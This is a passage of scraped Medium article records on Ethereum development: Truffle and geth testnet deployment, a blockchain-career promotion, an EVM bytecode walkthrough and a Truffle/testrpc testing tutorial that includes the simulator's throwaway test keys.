it in the real network! To do that, we need a real testnet/livenet Ethereum client. Follow these instructions to install geth.During development, you should run nodes in testnet mode, so that you can test everything out without risking real money. Testnet mode (also known as Morden in Ethereum) is basically identical to the real Ethereum, but the Ether token there has no monetary value. Don\u2019t be lazy and remember to always develop in testnet mode, you will regret it if you lose real Ether due to a programming error (trust me on that, hehe).Run geth in testnet mode, with RPC server enabled:geth --testnet --rpc console 2>> geth.logThis will open a console where you can type in basic commands to control your node/client. Your node will begin downloading the testnet blockchain, and you can check progress by checking eth.blockNumber. While the blockchain is downloading, you can still run commands. For example, let\u2019s create an account: (remember the password!)> personal.newAccount()Passphrase:Repeat passphrase:\"0xa88614166227d83c93f4c50be37150b9500d51fc\"Let\u2019s send some coins there and check the balance. You can get free testnet Ether here. Just copy-paste the address you just generated and this faucet will send you some testnet Ether. To check you balance, run:> eth.getBalance(eth.accounts[0])0It will show no balance because your node hasn\u2019t synced with the rest of the network yet. While you wait for that, check your balance in a testnet block explorer. There, you can also see the current testnet highest block number (#1819865 at the time of writing), which you can use in combination with eth.blockNumber to know when your node has synced completely.Once your node has synced, you\u2019re ready to deploy the contracts to the testnet using Truffle. First, unlock your main geth account, so that Truffle can use it. And be sure that it holds some balance, or you won\u2019t be able to push a new contract to the network. On geth run:> personal.unlockAccount(eth.accounts[0], \"mypassword\", 24*3600)true> eth.getBalance(eth.accounts[0])1000000000000000000Ready to go! If some of these two are not working for you, check the steps above and make sure you\u2019ve completed them correctly. Now run:$ truffle migrate --resetNote that this time, it will take longer to complete, as we\u2019re connecting to the actual network and not one simulated by testrpc. Once it completes, you can interact with the contract using the same approach as before.The testnet-deployed version of ProofOfExistence3 can be found at the address 0xcaf216d1975f75ab3fed520e1e3325dac3e79e05. (Feel free to interact with it and send your proofs!)I\u2019ll leave the details on how to deploy to the live network to the reader. You should only do this once you\u2019ve extensively tested your contracts in simulated and test networks. Remember any programming error can result in monetary loss in the livenet!Smart Contract security in Ethereum is hard\u201cSmart contracts are pretty difficult to get right.\u201d Emin G\u00fcn SirerGiven that by nature, smart contracts are computer code that define how money moves, I couldn\u2019t end this guide without even a small note on security. I\u2019ll be talking about smart contract security in much more depth at future posts (edit: like this one), but here are some quick notes to get you started.Some problems you should be aware of (and avoid):Reentrancy: Do not perform external calls in contracts. If you do, ensure that they are the very last thing you do.Send can fail: When sending money, your code should always be prepared for the send function to fail.Loops can trigger gas limit: Be careful when looping over state variables, which can grow in size and make gas consumption hit the limits.Call stack depth limit: Don\u2019t use recursion, and be aware that any call can fail if stack depth limit is reached. EDIT: this is no longer a problem.Timestamp dependency: Do not use timestamps in critical parts of the code, because miners can manipulate them.These are provided just as examples of unexpected behaviors that can lead for theft or destruction of funds in your smart contract. The moral is: if you\u2019re writing smart contracts, you\u2019re writing code that handles real money. You should be very careful! Write tests, do code reviews, and audit your code.The best way to avoid obvious security problems is to have a solid understanding of the language. I recommend you read the Solidity documentation if you have the time. We still need better tools for acceptable smart contract security. (Edit: close to the original publishing of this post, we launched the OpenZeppelin library, and we\u2019ve recently announced zeppelinOS.That\u2019s it! I hope you enjoyed reading this guide and learning your first steps in programming smart contracts in Ethereum! This is still a very new industry and there\u2019s lot of room for new apps and tools. Feel free to contact me with ideas or prototypes.Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 79, "tags": ["Smart Contracts", "Ethereum", "Blockchain", "Open Source", "Guide"]}, {"title": "Why You Should Learn to Build Blockchain Apps", "post_link": "https://medium.com/loom-network/why-you-should-learn-to-build-blockchain-apps-be9a92e8d08e?source=search_post", "author_name": "Georgios Konstantopoulos", "author_link": "https://medium.com/@gakonst", "publish_date": "2018-02-16", "last_modified_date": "2019-08-19", "readtime": "5.22", "claps": 5801, "voters": 768, "content": "Why You Should Learn to Build Blockchain AppsGeorgios KonstantopoulosFollowFeb 16, 2018 \u00b7 6 min readLast week we released CryptoZombies Lesson 4, where we continue our journey to build an army of zombies with Solidity, Ethereum\u2019s programming language. As of this lesson, over 90,000 people have used CryptoZombies and are getting more familiar with developing Decentralized Applications (DApps) on Ethereum.What we have not discussed so far is why should you get involved in this space? What is there to gain? Does it really matter?The one sure thing is that demand for Blockchain Developers (often called Blockchain Engineers) exceeds the supply by far, and this demand is increasing over time:Blockchain and Bitcoin were 2 of the top 3 fastest-growing skills on Upwork\u2019s Quarterly Skills Index in 2017.In this article, we\u2019re going to look at similar historical growth of innovative platforms, and some ways you can start making money as a blockchain developer as you develop your skillset.Lessons from the past: Google Play and Apple\u2019s App StoreLet\u2019s take some data from the two biggest app stores of today, Google\u2019s Google Play and Apple\u2019s App Store.In March 2009 the Google Play store (called Android Market at the time) had 2,300 apps available. By the end of October 2010 that number had increased to 100,000[1]. In February 2017 the amount of apps on Google Play store was around in the range of 2.7 million.App Store exhibited similar growth:App Store growth 2008\u20132017 | source: https://www.statista.com/statistics/263795/number-of-available-apps-in-the-apple-app-store/Will history repeat itself?If blockchain really is analogous to the internet in the early 90s, then DApps are in an analogous stage to the early-days of the app stores. We are going to see massive growth in DApp software developers over the coming years.I will take a phrase from Wikipedia\u2019s App Store (iOS) page,The term app has become a popular buzzword; in January 2011, app was awarded the honor of being 2010\u2019s \u201cWord of the Year\u201d [1]\u2026and make a bold prediction and adapt it to the DApp ecosystem:The term DApp has become a popular buzzword; in January 2019, DApp was awarded the honor of being 2018\u2019s \u201cWord of the Year\u201dWhat actually matters here is not if the above happens. It is when.Should you really look into this?If you are excited by:DecentralizationWorking with brilliant passionate mindsInnovationCutting-edge technologyHigh salaries (this happens mainly due to demand being much higher than available supply)\u2026then you should get familiar with blockchain development. Currently individuals, startups and even larger companies[2][3] are gradually joining the blockchain industry with their own products and they are actively looking for more employees to join their projects.Ways to make money as a blockchain developerThere are a number of ways you can start making money building DApps, depending on your current skill level.1. Build your own DApp and monetize itTaking CryptoKitties as an example, you can build a monetized DApp. There is huge potential here \u2014 CryptoKitties did over $12 million USD in sales in its first month after launch.If you look on DappRadar, you can see the volume of transactions different DApps are doing, with CryptoCountries currently topping the list at almost $40,000,000 in sales over the past 7 days. The developers take 2\u20135% of every transaction, so you can do the math and see what a profitable opportunity building your own DApp-based game can be.In our next article, we\u2019ll be covering in-depth the different business models you can use in your DApps to generate profits.2. Get paid for contributing to open-source projectsGitcoin aims to \u2018push open source forward\u2019 by attaching bounties denominated in Ether for solving github issues. Currently, there are more than $8.000 attached among 20 bounties, waiting to be claimed!All you need to do is solve an issue, and if the bounty submitter approves it, you will get paid in Ether via a smart contract.How does Gitcoin work? | https://gitcoin.co3. Create your own own Startup / CryptocurrencyLaunching an Ethereum token that is secure and can be used to trade value is as trivial as writing a few lines of code, thanks to OpenZeppelin. After you develop the coin, you can raise capital through an Initial Coin Offering (ICO).MVP of GustavoCoin in 10 lines of Code | https://blog.zeppelin.solutions/how-to-create-token-and-initial-coin-offering-contracts-using-truffle-openzeppelin-1b7a5dae99b6Of course, your project must have some kind of value in order to raise the required capital. (Or not, as has been the case with many high-profile ICOs \u2014 but that is another discussion).4. Work at a startupIf building your own startup isn\u2019t your thing, you can get hired as a developer on someone else\u2019s. There are a number of new projects springing up all the time that are looking for developers. Many of these projects raise millions of dollars via an ICO, and have a large budget for hiring skilled developers.You can take a quick look at AngelList and apply for a position that interests you.https://angel.co/blockchains/jobsBecause blockchain developers are in such high demand, many of these offer working remotely, which is a big plus for many.5. Work as a freelancerIf you prefer flexible and on-demand gigs, popular freelancing sites such as upwork.com or freelancer.com have job listings on potential projects that you can work part-time or on a per-project basis.You can search for positions such as Solidity Developer or Blockchain Engineer at these sites to grasp an idea of what positions are available.6. Join a larger companyLots of big companies hire from time to time, trying to explore their own corporate solution.Visa job listing at LinkedInHowever, judging by Visa asking for 8 years of Industry experience, then you\u2019re either Satoshi Nakamoto or drinking margaritas on your private island.Usually these jobs are not oriented towards fully public and decentralized systems, so if you\u2019re a blockchain purist, this may not be your cup of tea.OK, I\u2019m sold. How do I get started?As more and more resources on learning to code these unstoppable applications become publicly available, aspiring developers will be able to transition smoothly from traditional development to blockchain development.At Loom Network, we are contributing to this effort by building a community around tools and tutorials for learning to build DApps on Ethereum, the fastest-growing blockchain developer platform.Here\u2019s how we recommend you get started:Head to CryptoZombies.io, our interactive code school that teaches you to write Ethereum DApps through building your own crypto-collectables game.Join our Telegram community to join a thriving community of people talking about DApp development and scaling Ethereum.Check out our Medium page for our other articles on Solidity development.Hope to see you in our community, with the other developers who are on the forefront of this industry!Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 9, "tags": ["Blockchain", "Ethereum", "Programming", "Development", "Apps"]}, {"title": "Diving Into The Ethereum Virtual Machine", "post_link": "https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30?source=search_post", "author_name": "Howard", "author_link": "https://blog.qtum.org/@hayeah", "publish_date": "2017-08-06", "last_modified_date": "2018-10-12", "readtime": "8.08", "claps": 2387, "voters": 337, "content": "Diving Into The Ethereum Virtual MachineHowardFollowAug 6, 2017 \u00b7 9 min readSolidity offers many high-level language abstractions, but these features make it hard to understand what\u2019s really going on when my program is running. Reading the Solidity documentation still left me confused over very basic things.What are the differences between string, bytes32, byte[], bytes?Which one do I use, when?What\u2019s happening when I cast a string to bytes? Can I cast to byte[]?How much do they cost?How are mappings stored by the EVM?Why can\u2019t I delete a mapping?Can I have mappings of mappings? (Yes, but how does that work?)Why is there storage mapping, but no memory mapping?How does a compiled contract look to the EVM?How is a contract created?What is a constructor, really?What is the fallback function?I think it\u2019s a good investment to learn how a high-level language like Solidity runs on the Ethereum VM (EVM). For couple of reasons.Solidity is not the last word. Better EVM languages are coming. (Pretty please?)The EVM is a database engine. To understand how smart contracts work in any EVM language, you have to understand how data is organized, stored, and manipulated.Know-how to be a contributor. The Ethereum toolchain is still very early. Knowing the EVM well would help you make awesome tools for yourself and others.Intellectual challenge. EVM gives you a good excuse to play at the intersection of cryptography, data structure, and programming language design.In a series of articles, I\u2019d like to deconstruct simple Solidity contracts in order to understand how it works as EVM bytecode.An outline of what I hope to learn and write about:The basics of EVM bytecode.How different types (mappings, arrays) are represented.What is going on when a new contract is created.What is going on when a method is called.How the ABI bridges different EVM languages.My final goal is to be able to understand a compiled Solidity contract in its entirety. Let\u2019s start by reading some basic EVM bytecode!This table of EVM Instruction Set would be a helpful reference.A Simple ContractOur first contract has a constructor and a state variable:// c1.solpragma solidity ^0.4.11;contract C {    uint256 a;    function C() {      a = 1;    }}Compile this contract with solc:$ solc --bin --asm c1.sol======= c1.sol:C =======EVM assembly:    /* \"c1.sol\":26:94  contract C {... */  mstore(0x40, 0x60)    /* \"c1.sol\":59:92  function C() {... */  jumpi(tag_1, iszero(callvalue))  0x0  dup1  reverttag_1:tag_2:    /* \"c1.sol\":84:85  1 */  0x1    /* \"c1.sol\":80:81  a */  0x0    /* \"c1.sol\":80:85  a = 1 */  dup2  swap1  sstore  pop    /* \"c1.sol\":59:92  function C() {... */tag_3:    /* \"c1.sol\":26:94  contract C {... */tag_4:  dataSize(sub_0)  dup1  dataOffset(sub_0)  0x0  codecopy  0x0  returnstopsub_0: assembly {        /* \"c1.sol\":26:94  contract C {... */      mstore(0x40, 0x60)    tag_1:      0x0      dup1      revertauxdata: 0xa165627a7a72305820af3193f6fd31031a0e0d2de1ad2c27352b1ce081b4f3c92b5650ca4dd542bb770029}Binary:60606040523415600e57600080fd5b5b60016000819055505b5b60368060266000396000f30060606040525b600080fd00a165627a7a72305820af3193f6fd31031a0e0d2de1ad2c27352b1ce081b4f3c92b5650ca4dd542bb770029The number 6060604052... is bytecode that the EVM actually runs.In Baby StepsHalf of the compiled assembly is boilerplate that\u2019s similar across most Solidity programs. We\u2019ll look at those later. For now, let\u2019s examine the unique part of our contract, the humble storage variable assignment:a = 1This assignment is represented by the bytecode 6001600081905550. Let\u2019s break it up into one instruction per line:60 0160 0081905550The EVM is basically a loop that execute each instruction from top to bottom. Let\u2019s annotate the assembly code (indented under the label tag_2) with the corresponding bytecode to better see how they are associated:tag_2:  // 60 01  0x1  // 60 00  0x0  // 81  dup2  // 90  swap1  // 55  sstore  // 50  popNote that 0x1 in the assembly code is actually a shorthand for push(0x1). This instruction pushes the number 1 onto the stack.It still hard to grok what\u2019s going on just staring at it. Don\u2019t worry though, it\u2019s simple to simulate the EVM line by line.Simulating The EVMThe EVM is a stack machine. Instructions might use values on the stack as arguments, and push values onto the stack as results. Let\u2019s consider the operation add.Assume that there are two values on the stack:[1 2]When the EVM sees add, it adds the top 2 items together, and pushes the answer back onto the stack, resulting in:[3]In what follows, we\u2019ll notate the stack with []:// The empty stackstack: []// Stack with three items. The top item is 3. The bottom item is 1.stack: [3 2 1]And notate the contract storage with {}:// Nothing in storage.store: {}// The value 0x1 is stored at the position 0x0.store: { 0x0 => 0x1 }Let\u2019s now look at some real bytecode. We\u2019ll simulate the bytecode sequence 6001600081905550 as EVM would, and print out the machine state after each instruction:// 60 01: pushes 1 onto stack0x1  stack: [0x1]// 60 00: pushes 0 onto stack0x0  stack: [0x0 0x1]// 81: duplicate the second item on the stackdup2  stack: [0x1 0x0 0x1]// 90: swap the top two itemsswap1  stack: [0x0 0x1 0x1]// 55: store the value 0x1 at position 0x0// This instruction consumes the top 2 itemssstore  stack: [0x1]  store: { 0x0 => 0x1 }// 50: pop (throw away the top item)pop  stack: []  store: { 0x0 => 0x1 }The end. The stack is empty, and there\u2019s one item in storage.What\u2019s worth noting is that Solidity had decided to store the state variable uint256 a at the position 0x0. It's perfectly possible for other languages to choose to store the state variable elsewhere.In pseudocode, what the EVM does for 6001600081905550 is essentially:// a = 1sstore(0x0, 0x1)Looking carefully, you\u2019d see that the dup2, swap1, pop are superfluous. The assembly code could be simpler:0x10x0sstoreYou could try to simulate the above 3 instructions, and satisfy yourself that they indeed result in the same machine state:stack: []store: { 0x0 => 0x1 }Two Storage VariablesLet\u2019s add one extra storage variable of the same type:// c2.solpragma solidity ^0.4.11;contract C {    uint256 a;    uint256 b;    function C() {      a = 1;      b = 2;    }}Compile, focusing on tag_2:$ solc --bin --asm c2.sol// ... more stuff omittedtag_2:    /* \"c2.sol\":99:100  1 */  0x1    /* \"c2.sol\":95:96  a */  0x0    /* \"c2.sol\":95:100  a = 1 */  dup2  swap1  sstore  pop    /* \"c2.sol\":112:113  2 */  0x2    /* \"c2.sol\":108:109  b */  0x1    /* \"c2.sol\":108:113  b = 2 */  dup2  swap1  sstore  popThe assembly in pseudocode:// a = 1sstore(0x0, 0x1)// b = 2sstore(0x1, 0x2)What we learn here is that the two storage variables are positioned one after the other, with a in position 0x0 and b in position 0x1.Storage PackingEach slot storage can store 32 bytes. It\u2019d be wasteful to use all 32 bytes if a variable only needs 16 bytes. Solidity optimizes for storage efficiency by packing two smaller data types into one storage slot if possible.Let\u2019s change a and b so they are only 16 bytes each:pragma solidity ^0.4.11;contract C {    uint128 a;    uint128 b;    function C() {      a = 1;      b = 2;    }}Compile the contract:$ solc --bin --asm c3.solThe generated assembly is now more complex:tag_2:  // a = 1  0x1  0x0  dup1  0x100  exp  dup2  sload  dup2  0xffffffffffffffffffffffffffffffff  mul  not  and  swap1  dup4  0xffffffffffffffffffffffffffffffff  and  mul  or  swap1  sstore  pop  // b = 2  0x2  0x0  0x10  0x100  exp  dup2  sload  dup2  0xffffffffffffffffffffffffffffffff  mul  not  and  swap1  dup4  0xffffffffffffffffffffffffffffffff  and  mul  or  swap1  sstore  popThe above assembly code packs these two variables together in one storage position (0x0), like this:[         b         ][         a         ][16 bytes / 128 bits][16 bytes / 128 bits]The reason to pack is because the most expensive operations by far are storage usage:sstore costs 20000 gas for first write to a new position.sstore costs 5000 gas for subsequent writes to an existing position.sload costs 500 gas.Most instructions costs 3~10 gases.By using the same storage position, Solidity pays 5000 for the second store variable instead of 20000, saving us 15000 in gas.More OptimizationInstead of storing a and b with two separate sstore instructions, it should be possible to pack the two 128 bits numbers together in memory, then store them using just one sstore, saving an additional 5000 gas.You can ask Solidity to make this optimization by turning on the optimize flag:$ solc --bin --asm --optimize c3.solWhich produces assembly code that uses just one sload and one sstore:tag_2:    /* \"c3.sol\":95:96  a */  0x0    /* \"c3.sol\":95:100  a = 1 */  dup1  sload    /* \"c3.sol\":108:113  b = 2 */  0x200000000000000000000000000000000  not(sub(exp(0x2, 0x80), 0x1))    /* \"c3.sol\":95:100  a = 1 */  swap1  swap2  and    /* \"c3.sol\":99:100  1 */  0x1    /* \"c3.sol\":95:100  a = 1 */  or  sub(exp(0x2, 0x80), 0x1)    /* \"c3.sol\":108:113  b = 2 */  and  or  swap1  sstoreThe bytecode is:600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055And formatting the bytecode to one instruction per line:// push 0x060 00// dup180// sload54// push17 push the the next 17 bytes as a 32 bytes number70 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00/* not(sub(exp(0x2, 0x80), 0x1)) */// push 0x160 01// push 0x80 (32)60 80// push 0x80 (2)60 02// exp0a// sub03// not19// swap190// swap291// and16// push 0x160 01// or17/* sub(exp(0x2, 0x80), 0x1) */// push 0x160 01// push 0x8060 80// push 0x0260 02// exp0a// sub03// and16// or17// swap190// sstore55There are four magic values used in the assembly code:0x1 (16 bytes), using lower 16 bytes// Represented as 0x01 in bytecode16:32 0x0000000000000000000000000000000000:16 0x000000000000000000000000000000010x2 (16 bytes), using higher 16bytes// Represented as 0x200000000000000000000000000000000 in bytecode16:32 0x0000000000000000000000000000000200:16 0x00000000000000000000000000000000not(sub(exp(0x2, 0x80), 0x1))// Bitmask for the upper 16 bytes16:32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00:16 0x00000000000000000000000000000000sub(exp(0x2, 0x80), 0x1)// Bitmask for the lower 16 bytes16:32 0x00000000000000000000000000000000 00:16 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFThe code does some bits-shuffling with these values to arrive at the desired result:16:32 0x00000000000000000000000000000002 00:16 0x00000000000000000000000000000001Finally, this 32bytes value is stored at position 0x0.Gas Usage600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055Notice that 0x200000000000000000000000000000000 is embedded in the bytecode. But the compiler could\u2019ve also chosen to calculate the value with the instructions exp(0x2, 0x81), which results in shorter bytecode sequence.But it turns out that 0x200000000000000000000000000000000 is a cheaper than exp(0x2, 0x81). Let's look at the gas fees involved:4 gas paid for every zero byte of data or code for a transaction.68 gas for every non-zero byte of data or code for a transaction.Let\u2019s compare how much either representation costs in gas.The bytecode 0x200000000000000000000000000000000. It has many zeroes, which are cheap.(1 * 68) + (16 * 4) = 196.The bytecode 608160020a. Shorter, but no zeroes.5 * 68 = 340.The longer sequence with more zeroes is actually cheaper!SummaryAn EVM compiler doesn\u2019t exactly optimize for bytecode size or speed or memory efficiency. Instead, it optimizes for gas usage, which is an layer of indirection that incentivizes the sort of calculation that the Ethereum blockchain can do efficiently.We\u2019ve seen some quirky aspects of the EVM:EVM is a 256bit machine. It is most natural to manipulate data in chunks of 32 bytes.Persistent storage is quite expensive.The Solidity compiler makes interesting choices in order to minimize gas usage.Gas costs are set somewhat arbitrarily, and could well change in the future. As costs change, compilers would make different choices.In this article series about the EVM I write about:Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.How ABI Encodes External Method Calling.What is going on when a new contract is created.If you\u2019d like to learn more about the EVM, subscribe to my weekly tutorial:", "responses": 12, "tags": ["Ethereum", "Blockchain", "Qtum", "Blockchain 101", "Solidity"]}, {"title": "Smart Contract Testing & Ethereum Simulator", "post_link": "https://medium.com/etherereum-salon/eth-testing-472c2f73b4c3?source=search_post", "author_name": "Amazingandyyy", "author_link": "https://medium.com/@amazingandyyy", "publish_date": "2017-08-05", "last_modified_date": "2018-06-21", "readtime": "6.65", "claps": 980, "voters": 163, "content": "Smart Contract Testing & Ethereum SimulatorAmazingandyyyFollowAug 5, 2017 \u00b7 7 min readIn my last tutorial, I show Solidity programming language a bit and what it feels like to develop a simple HelloWorld smart contract. Today, I am talking about testing which is an important topic in development, especially for the smart contract development.All codes in this tutorial are available in this repoamazingandyyy/the-good-ethereum-smart-contract-tutorialthe-good-ethereum-smart-contract-tutorial - Repo for The Complete Ethereum Smart Contract Development tutorials series.github.comTwo facts about smart contract written in SolidityTwo specific facts in smart contract development that you need to know before I jump in to today\u2019s topic.Solidity doesn\u2019t natively support logging functions such as console.log() function in Javascript/NodeJS or print() function in python.The smart contract is executed by Ethereum virtual machine(EVM), so we always need a node or a piece of the Ethereum network to execute the contract. With that been said, you cannot execute a contract in an intuitive manner locally like you did with node, golang, or others.$ node ./filename.js  -> okay for nodejs$ go   ./filename.go  -> okay for golang$ solc ./contract.sol -> not okay for solidityI hope you can understand the difficulty of logging and executing a smart contract now.Options to execute a contractHere are some options to execute your contract.Deploy the contract to live(the real) Ethereum main network and execute it. Cost about 5 minutes and real money(slow, public(dangerous), $$$) to deploy and execute.Deploy the contract to testnet (for developers\u2019 usage) Ethereum network and execute it. Cost about 2 minutes to deploy and free ether(slow, public(dangerous), free)Deploy to an Ethereum network simulator and execute it. Cost about 3 seconds and free(fast, private(nice!!), free)In a development lifecycle which we usually want to do unlimited deploying, testing, updating\u2026 for many times (let\u2019s say, probably 100+ times in an afternoon.). Then option 3 is the best option. And it is what I am sharing with you in this tutorial. (I will teach you about option 1, 2 in the future post).PreparationInstallation packagesTo prepare, please do following commands to download truffle and ethereumjs-testrpc$ npm i -g truffle ethereumjs-testrpcPrepare contractdownload this repo and go to 02-Testing/startYou should see the files like this.\u251c\u2500\u2500 contracts\u2502   \u251c\u2500\u2500 HelloEthSalon.sol\u2502   \u2514\u2500\u2500 Migrations.sol\u251c\u2500\u2500 migrations\u2502   \u2514\u2500\u2500 1_initial_migration.js\u251c\u2500\u2500 test\u251c\u2500\u2500 truffle-config.js\u2514\u2500\u2500 truffle.js3 directories, 5 filesand the HelloEthSalon contract should look like this, and this is what we build in the last tutorial.pragma solidity ^0.4.4;contract HelloEthSalon {  string message = \"Hello Ethereum Salon!\";  function HelloEthSalon() {     // constructor  }  function GetMessage() returns (string) {     return message;  }}Let\u2019s write a testing file in JavascriptYes, the most popular way to test a Smart Contract is writing a testing file in Javascript (Javascript wins again).In the HelloEthSalon contract, we have a function GetMessage() that returns a string of Hello Ethereum Salon!. Let\u2019s write a testing file to test if the function will actually do the job.In the 02-Testingfolder, use truffle create test command to start a testing file.$ truffle create test HelloEthSalonAs you can see, the new folder structure should like this:.\u251c\u2500\u2500 contracts\u2502   \u251c\u2500\u2500 HelloEthSalon.sol\u2502   \u2514\u2500\u2500 Migrations.sol\u251c\u2500\u2500 migrations\u2502   \u2514\u2500\u2500 1_initial_migration.js\u251c\u2500\u2500 test\u2502   \u2514\u2500\u2500 hello_eth_salon.js\u251c\u2500\u2500 truffle-config.js\u2514\u2500\u2500 truffle.js5 directories, 8 filesHope you notice that we have a new file called hello_eth_salon.js under the test folder. The file looks like following,contract('HelloEthSalon', function(accounts) {  it(\"should assert true\", function(done) {    var hello_eth_salon = HelloEthSalon.deployed();    assert.isTrue(true);    done();  });});Here, we thanks truffle for two things:It smartly helps us naming the testing file as hello_eth_salon.js when we call the contract HelloEthSalon .This testing file looks like Mocha-style testing. Yes, we are using Mocha under the hood for smart contract testing.https://mochajs.org/If you want, I recommend you to split your editor to two sessions. One with the contract itself and other is for writing test file.Let\u2019s write the testing file as below,var HelloEthSalon = artifacts.require('./HelloEthSalon.sol');contract(\u2018HelloEthSalon:GetMessage\u2019, function(accounts) {  it(\u201cshould return a correct string\u201d, function(done) {    var hello_eth_salon = HelloEthSalon.deployed();    hello_eth_salon.then(function(contract){      return contract.GetMessage.call(); // **IMPORTANT    }).then(function(result){      assert.isTrue(result === \u2018Hello Ethereum Salon!\u2019);      done();    })  });});here are four important points to check:don\u2019t forget to import the contract from \u2018./HelloEthSalon.sol\u2019 in the first line.HelloEthSalon.deployed() is a Promise; please help yourself familiar with Promise, because you will use promise a lot in smart contract development since interacting with Ethereum network is always an async behavior, which mean data will come back at some point later.In line 7, I have an important notes, please remember to use contract.GetMessage.call(); instead usingcontract.GetMessage(); directlyThe assertion statement assert.isTrue(result === \u2018Hello Ethereum Salon!\u2019); is checking if the result we get from contract.GetMessage.call(); is equal to a string of Hello Ethereum Salon!.Next, do the truffle test command in the 02-Testing folder,$ truffle test ./test/hello_eth_salon.jsWhat did you see? Here we go, we got a really normal/typical error!Could not connect to your Ethereum client. Please check that your Ethereum client:    - is running    - is accepting RPC connections (i.e., \"--rpc\" option is used in geth)    - is accessible over the network    - is properly configured in your Truffle configuration file (truffle.js)We will fix this together in the next session.Start your Ethereum SimulatorWhen you do the truffle command, it tries to connect to a Ethereum node, and it, by default, tried to talk a local node on port localhost:8545 by a RPC manner, and notes 8545 is the conventional port for ethereum-node.Here is some explanation about RPC(Remote procedure call) in case you want to learn more.In distributed computing, a remote procedure call (RPC) is when a computer program causes a procedure (subroutine) to execute in a different address space (commonly on another computer on a shared network), which is coded as if it were a normal (local) procedure call, without the programmer explicitly coding the details for the remote interaction.(source: wikipedia)Eventually, Ethereum just follows the RPC method to have a port that something can talk to. Let\u2019s start a ethereum-rpc on your machine. Just do command testrpc in a new terminal session$ testrpcand it will see it starts as normal:EthereumJS TestRPC v6.0.3 (ganache-core: 2.0.2)Available Accounts==================(0) 0x5cc6ee5c4fe0ff63dccb85d5faa802b4e42db244(1) 0x2442e95edad609c8bf8952384eb1952ec46cc95c(2) 0xf5f751a7b0fde6b2094bc61bbfe2ec3bc9ed4d80(3) 0xdf1cf123bdd9871c0973d271045bc5ee138f055a(4) 0x7a98259c8cb95b4f10e4425a44a2e5d3240b04a9(5) 0xa1901a3f5f97615494b4605eb22a651de6dc00d8(6) 0x2d0ada820168741f46ba15140da45d1f0e114296(7) 0x5a8f3babe912170323b8f9bd725f67cfe2d8056a(8) 0x3bde7be31bc39c4d8ad8d14ed7e23cbc4e92d3bd(9) 0xaa3ab94e3205bdb32ebd2c0f5bccf240c1026facPrivate Keys==================(0) 565fc08465e8678ef34de22ba9d65d71f388992d04b9fc920e4f7bfa4e169639(1) 86ebfebd22c626bb3d1ddf8c52332bea4b1f6c0ec210a23e7c248296609006ca(2) 92b48fcae318e01c2fb082216df921c15b13a9d6842a624e269f2a5630ab63c4(3) 1c053daa96d53e88585319b9ae1245bfcbc95c8fd8795ff470e98042e4537262(4) de78e74db0a5c8dae8103c5990ccfed38ceb7b564b6ac6a2d478292af66cabea(5) c66991438d785e225e9d785cd2e51c2e3adcafe50feb8fa77f6c670e32471f22(6) 00f67f7649f94b73dacef7fd717dd125ff9f0be00762ca4e928d45885df65010(7) 8407d5e870732f4cbf7d9ee78284db197fa95feffeec317bed294e1827231ffc(8) 6800704a7ce0651271cb6392a3f477609f3c61abcec72cc0bf6a78e8c07f9b9c(9) 09e13e69dad0025411039bc4e0e025b7d2b11aa5a46799318f2ae64fada6df42HD Wallet==================Mnemonic:      obtain cereal choose inquiry mercy perfect fee leopard owner live mechanic hipBase HD Path:  m/44'/60'/0'/0/{account_index}Listening on localhost:8545It will start with some fake accounts and private keys, and available on localhost:8545. If you see the localhost:8545 , congrats, move to next step, if not, message me, I am willing to help.(It should usually work)Let\u2019s test it.Again, do the truffle test command in the 02-Testing folder,$ truffle test ./test/hello_eth_salon.jsFirst, you see it compile and \u2026 and\u2026. Boom, another Error:Using network 'development'.Contract: HelloEthSalon:GetMessage    1) should return a correct string    > No events were emitted0 passing (22ms)  1 failing1) Contract: HelloEthSalon:GetMessage should return a correct string:     Error: HelloEthSalon has not been deployed to detected network (network/artifact mismatch)      at /Users/andy/.nvm/versions/node/v8.5.0/lib/node_modules/truffle/build/cli.bundled.js:318327:17      at <anonymous>      at process._tickCallback (internal/process/next_tick.js:188:7)The Error said HelloEthSalon has not been deployed to detected network (network/artifact mismatch).Okay, so the thing is that besides starting the testrpc up, we also need to deploy our contract to the just-startedtestrpc Ethereum Simulator. What we need to do is to update our 1_initial_migration.js file under migrations folder. It should be lookedvar Migrations = artifacts.require(\"./Migrations.sol\");module.exports = function(deployer) {  deployer.deploy(Migrations);};Let\u2019s import our HelloEthSalon contract right after the MetaCoin importing statement and add a new deploy call right after the deployer.deploy(MetaCoin); . The updated deploy javascript file should be this:If you are done, again, do the truffle test command in the 02-Testing folder$ truffle test ./test/hello_eth_salon.jsFirst, you see it compile and do the testing as following:Using network 'development'.Contract: HelloEthSalon:GetMessage    \u2713 should return a correct string1 passing (44ms)if you see the \u2713 checking mark, congrats, we finish your first ever smart contract testing.In case you need, here is the whole testcase codes:Let\u2019s change the contract and update the testing case.Let\u2019s change the message global variable in he HelloEthSalon contract. Change the message to \u201cI know testing of a contract!!\u201d, yes two exclamation points. And deploy it again by truffle deploy command.$ truffle migrateAnd go to update the test case, to check if the message is what we expect.$ truffle test ./test/hello_eth_salon.jsIf you see the \u2713 checking mark, congratulations, you now know to build a safer contract by implementing testing.The new contract should look likeAnd the updated testing file should look likeIf you enjoyed this article, please share with your developer/blockchain friends and claps if this write-up is anyhow inspiring and helpful. Please feel free to comment if you encounter any errors and any feedback will be appreciated.", "responses": 17, "tags": ["Ethereum", "Ethereum Blockchain", "Solidity", "Blockchain", "Smart Contracts"]}, {"title": "CryptoZombies has come to a fork in the road (+Surprise Rewards \ud83c\udf89)", "post_link": "https://medium.com/loom-network/cryptozombies-has-come-to-a-fork-in-the-road-surprise-rewards-1a950f2c9d4e?source=search_post", "author_name": "\ud83d\udc7d Dilanka | Loom Network", "author_link": 